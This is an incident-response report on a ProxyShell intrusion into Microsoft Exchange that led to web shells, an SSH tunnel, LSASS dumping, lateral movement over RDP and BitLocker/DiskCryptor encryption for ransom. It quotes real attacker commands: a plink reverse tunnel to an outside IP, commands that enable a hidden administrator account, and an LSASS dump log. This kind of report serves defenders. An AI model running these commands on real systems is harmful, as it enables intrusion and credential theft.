# Case Summary 

We observed an intrusion where an adversary exploited multiple Exchange vulnerabilities (ProxyShell) to drop multiple web shells. Over the course of three days, three different web shells were dropped in publicly accessible directories. These web shells, exposed to the internet, were used to execute arbitrary code on the Microsoft Exchange Server utilizing PowerShell and cmd. After gaining an initial foothold on the Exchange system, the threat actors started discovery by executing commands like ipconfig, net, ping, systeminfo, and others, using the previously dropped web shells. This battery of initial discovery included a network call out to themoscowtimes[.]com. The threat actors repeated these tests twice over the first two days. On the third day, the next phase of the intrusion was underway. Since the commands executed via the web shell run with SYSTEM level privileges, threat actors took advantage of this and enabled a built-in account DefaultAccount, set the password and added it to Administrator and Remote Desktop Users groups. The threat actors then dropped Plink and established an SSH tunnel to expose RDP over the tunnel. They then connected to the Exchange server over RDP using the DefaultAccount account. They then copied their tools into the environment via RDP, which was observed when CacheTask.zip was copied to disk. This compressed file had a few files in it: CacheTask.bat

CacheTask.xml

dllhost.exe

install-proxy.bat

RuntimeBroker

Right after the transfer, the adversaries executed install-proxy.bat to create two directories and move CacheTask.bat, dllhost.exe and RuntimeBroker into their respective folder. A scheduled task was created and executed, to execute install-proxy.bat, which established network persistence via Fast Reverse Proxy (FRP) which was used to proxy RDP traffic during the intrusion.

Utilizing the Plink RDP connection, the threat actor dumped LSASS using Task Manager. Thirty minutes later, the threat actor started using a domain administrator account.

Using the stolen Domain Admin account, adversaries performed port scanning with KPortScan 3.0 and then moved laterally using RDP. Targeted servers included backup systems and domain controllers. The threat actor also deployed the FRP package to these systems after gaining access.

Finally, the threat actors deployed setup.bat across the servers in the environment using RDP and then used an open source disk encryption utility to encrypt the workstations. Setup.bat ran commands to enable BitLocker encryption, which resulted in the hosts being inoperable.

To encrypt workstations, an open source utility called DiskCryptor was utilized. This was dropped on the workstations via RDP sessions and then executed to install the utility and setup the encryption. The utility required a reboot to install a kernel mode driver and then another reboot to lock out access to the workstations.

The time to ransom (TTR) of this intrusion, from the first successful ProxyShell exploitation to ransom, was around 42 hours. If the blue team failed to detect the intrusion up until the DefaultAccount being enabled, they would have had 8 hours to respond and evict the threat actors before being ransomed.

The threat actors left a ransom note requesting 8,000 USD to get the encryption keys for the systems.


# Analysis

This time we will talk about ProxyShell, which revealed itself around August 2021. Once again, the vulnerability affects Microsoft Exchange servers. Specifically, the on-prem versions identified as Exchange Server 2013, Exchange Server 2016 and Exchange Server 2019. It is interesting to note how the ProxyShell vulnerability, originally identified and exploited by Orange Tsai (@orange_8361), includes a chain of 3 different CVEs:
- CVE-2021-34473
- CVE-2021-34523
- CVE-2021-31207

In this specific scenario, we observed the presence and exploitation of all the CVEs indicated above so; specifically, the attacker was able to exploit a Pre-auth Path Confusion Leads to ACL Bypass (CVE-2021-34473), an Elevation of Privilege on Exchange PowerShell Backend (CVE-2021-34523), and finally a Post-auth Arbitrary-File-Write Leads to RCE (CVE-2021-31207). This last CVE allowed the creation of multiple web shells. The method used by the actor in this incident was to first use the elevated PowerShell privileges to run the following discovery cmdlets:

Get-MailboxRegionalConfiguration Get-Mailbox Get-ExchangeServer Get-InboxRule

This was shortly followed by the cmdlet “New-ManagementRoleAssignment” responsible for granting mailbox import/export privileges before running “New-MailboxExportRequest”. The cmdlet would export a Mailbox to a provided location with the .aspx extention. While the file is a legitimate .pst file, in contains plaintext web shell code that is rendered by IIS when requested.

Below is an example of one of the IPs who successfully exploited the vulnerabilities:



Three web shells were spotted during our investigation:



The login.aspx web shell is a simple web shell which takes a command and runs it using cmd.exe. We believe the threat actor used aspx_qdajscizfzc.aspx to upload login.aspx and that’s why the parent process is w3wp. Here’s what the web shell looked like:

This is the web shell code for login.aspx:



The other two web shells were dropped upon the successful exploitation of ProxyShell. Running file command on these two web shells, show that they are actually PST files that contain web shell:

The first web shell, aspx_qdajscizfzx.apsx, can upload files and runs cmd.exe:



The second web shell, aspx_gtonvbgidhh.apsx, can upload files and runs powershell.exe:



# Execution

The threat actors executed a script named install-proxy.bat, containing the following lines of code:

The script creates two directories, then moves files into their respective directories. It first stops and then deletes a task named CacheTask if it exists. It then Creates a schedule task which will call an XML file which then executes CacheTask.bat

CacheTask.bat is a script that loops the execution of the Fast Reverse Proxy (FRP) binary:

Below is a screenshot of dllhost.exe hash lookup in VirusTotal, matching Florian Roth’s Yara rule HKTL_PUA_FRP_FastReverseProxy_Oct21_1:



The C:\ProgramData\Microsoft\Windows\Runtime\RuntimeBroker file is linked to the execution above, and contained the following lines of code which are a configuration file for FRP:

The above configuration creates a http proxy bound to port 10151/tcp using encryption and compression.

The threat actors also dropped and executed plink.exe, creating a remote SSH tunnel to 148.251.71[.]182 (tcp[.]symantecserver[.]co) in order to reach the RDP port on the Exchange system over the internet:

"powershell.exe" /c echo y | plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 148.251.71.182 -P 22 -l forward -pw [email protected] -no-antispoof

In the command line above you can see several options being used:


After running the above Plink command, the threat actors had RDP access into the environment over the SSH tunnel.

# Persistence

# Valid Accounts

To maintain persistence on patient 0, the threat actors leveraged the built-in DefaultAccount. It is a user-neutral account that can be used to run processes that are either multi-user aware or user-agnostic. The DSMA is disabled by default on the desktop SKUs (full windows SKUs) and WS 2016 with the Desktop (Reference).

To achieve persistence, the threat actors enabled the DefaultAccount by running the following command, using a web shell:

"powershell.exe" /c net user DefaultAccount / active : yes

After activating the account, the threat actors set the password of this account to [email protected] and added it to Administrators and Remote Desktop Users groups.

"powershell.exe" /c net user DefaultAccount P @ssw0rd "powershell.exe" /c net localgroup "Remote Desktop Users" /Add DefaultAccount "powershell.exe" /c net localgroup Administrators /Add DefaultAccount

# Privilege Escalation

ProxyShell exploitation provided the threat actors with NT AUTHORITY\SYSTEM privileges. Those privileges allowed them to enable the DefaultAdmin account to get access to the Mail Server using valid credentials. Moreover, the threat actors managed to dump LSASS and steal a domain administrator account, which was used to perform lateral movement.

# Defense Evasion

Advanced defense evasion techniques, such as impairing defenses or process injections, were not used during this intrusion. However, the threat actors performed masquerading with many of their tools:

They created login.aspx web shell in the same folder as the legitimate OWA login page.

They renamed Fast Reverse Proxy to dllhost.exe to remain stealthy

They created the Scheduled Task with “\Microsoft\Windows\Maintenance\CacheTask” name to stay un-noticed

# Credential Access

# LSASS Dump

The threat actors dumped LSASS process manually using the Task Manager CAR-2019-08-001:

File created: RuleName: - UtcTime: REDACTED 10 : 40 : 24.958 ProcessGuid: {BF388D9C-AB02- 614 D-B552- 000000000700 } ProcessId: 17480 Image: C:\Windows\system32\taskmgr.exe TargetFilename: C:\Users\DefaultAccount\AppData\Local\Temp\ 2 \lsass.DMP

To facilitate the LSASS dump exfiltration, the threat actors created a zip archive named lsass.zip:


# Discovery

# Environment Discovery

As previously mentioned, we saw multiple cmdlets related to exchange:

Get-MailboxRegionalConfiguration Get-Mailbox Get-ExchangeServer Get-InboxRule

Using the dropped web shells, the threat actors performed the following commands:



# Port Scanning

The threat actors used KPortScan 3.0, a widely used port scanning tool on Hacking Forums, to perform network scanning on the internal network:



# Lateral Movement

The threat actors mainly used Remote Desktop Services (RDP) to move laterally to other servers using the stolen domain admin account. Below is an extract focusing on RDP activity from patient 0:



The threat actors also appeared to use Impacket’s wmiexec to perform lateral movement on one of the domain controllers.



We do not have a clear explanation for that behavior. However, we strongly believe that this was related to the deployment of the encryption script, as it happened just a few minutes before its manual execution on servers.

# Collection

No data collection was observed in this intrusion. The threat actors only collected the dumped LSASS using a zip archive:


# Command and Control

No Command and Control frameworks were used during this intrusion. Initial access to the environment was performed using the web shell upon the exploitation of ProxyShell, then using valid accounts and Remote Desktop Services.

Threat actors created a SSH tunnel to 148.251.71[.]182 using plink in order to forward RDP access:



Looking at this IP address on VirusTotal, we can observe that all “Communicating Files” related to it trigger FRP AV Signatures or Yara rules:



We can conclude that those threat actors are used to this protocol tunneling technique.

# Exfiltration

Except lsass.zip, no data exfiltration or staging have been observed during this intrusion.

# Impact

In this intrusion the threat actors used BitLocker and an open source encrypter, DiskCryptor, in order to encrypt systems domain wide. On servers a batch script named setup.bat was used and on workstations the GUI application named dcrypt.exe(DiskCryptor) was executed instead. Both were executed via the threat actors after RDP login to each host.

On servers they copied over a file named setup.bat.

They then manually executed the script which disables the event log service, enables BitLocker (and RDP), prepares system drive using BdeHdCfg (a BitLocker drive encryption preparation tool), restarts the system, and deletes itself.

Below are the commands executed by the script:

Running this script on servers made them inaccessible, and the following BitLocker encryption message was shown when restarted:



A binary called dcrypt.exe, was dropped on a backup server and immediately deleted. While this utility was not executed on any servers in the environment it was deployed to all the workstations.

The executable used is the current release of the installer for the utility DiskCryptor.

We are unsure why DiskCrypter was used on workstations but we believe it may have something to do with not all workstation versions supporting BitLocker.

https://en.wikipedia.org/wiki/BitLocker

Use of this utility on workstations ensures a reliable encryption without the need to develop their own ransomware or get into a ransomware as a service affiliate program.

This executable, however, reminds you on install that it is “beta” software.

The setup process then works as most windows installers and requires a reboot of the system. During installation a kernel mode driver is added to support the encryption process.

After reboot, the program GUI allows you to configure the encryption options.

After encryption completed, the systems were rebooted and left with the following screen: The threat actors left their note requesting 8,000 USD on a domain controller which was not rebooted or locked out. The note pointed to Telegram and ProtonMail contacts

# MITRE ATT&CK DATASET

OS Credential Dumping – T1003

Network Service Scanning – T1046

Remote Desktop Protocol – T1021.001

Account Manipulation – T1098

Valid Accounts – T1078

Protocol Tunneling – T1572

Ingress Tool Transfer – T1105

Match Legitimate Name or Location – T1036.005

Windows Service – T1543.003

Data Encrypted for Impact – T1486

Web Shell – T1505.003

System Information Discovery – T1082

System Network Configuration Discovery – T1016

System Owner/User Discovery – T1033

Windows Command Shell – T1059.003 Internal case #6898

